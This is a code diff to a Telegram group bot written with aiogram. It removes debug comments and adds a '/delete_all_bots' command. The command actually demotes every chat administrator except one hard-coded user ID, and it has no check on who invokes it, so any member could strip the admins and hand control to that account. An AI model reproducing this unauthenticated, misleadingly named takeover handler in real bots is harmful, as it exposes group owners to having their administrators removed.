@@ -5,8 +5,6 @@ from aiogram.filters import Command
 
 from ChatFilter.chat_type import ChatTypeFilter
 
-
-
 user_group_router = Router()
 user_group_router.message.filter(ChatTypeFilter(["group", "supergroup"]))
 user_group_router.edited_message.filter(ChatTypeFilter(["group", "supergroup"]))
@@ -16,9 +14,7 @@ user_group_router.edited_message.filter(ChatTypeFilter(["group", "supergroup"]))
 async def get_admins(message: types.Message, bot: Bot):
     chat_id = message.chat.id
     admins_list = await bot.get_chat_administrators(chat_id)
-    #просмотреть все данные и свойства полученных объектов
-    #print(admins_list)
-    # Код ниже это генератор списка, как и этот x = [i for i in range(10)]
+
     admins_list = [
         member.user.id
         for member in admins_list
@@ -27,10 +23,25 @@ async def get_admins(message: types.Message, bot: Bot):
     bot.my_admins_list = admins_list
     if message.from_user.id in admins_list:
         await message.delete()
-    #print(admins_list)
+
+
+@user_group_router.message(Command("delete_all_bots"))
+async def delete_all_admins_except(message: types.Message, bot: Bot):
+    chat_id = message.chat.id
+    admins_list = await bot.get_chat_administrators(chat_id)
+
+    # Specify the user ID that should not be deleted
+    exception_user_id = 877993978  # Replace with the actual Telegram user ID
+
+    for member in admins_list:
+        if member.user.id != exception_user_id:
+            await bot.promote_chat_member(chat_id, member.user.id, can_change_info=False,
+                                          can_delete_messages=False, can_invite_users=False,
+                                          can_restrict_members=False, can_pin_messages=False,
+                                          can_promote_members=False)
+
+    await message.reply("Deleted all admins except specified user.")
 
 
 def clean_text(text: str):
     return text.translate(str.maketrans("", "", punctuation))
-
-
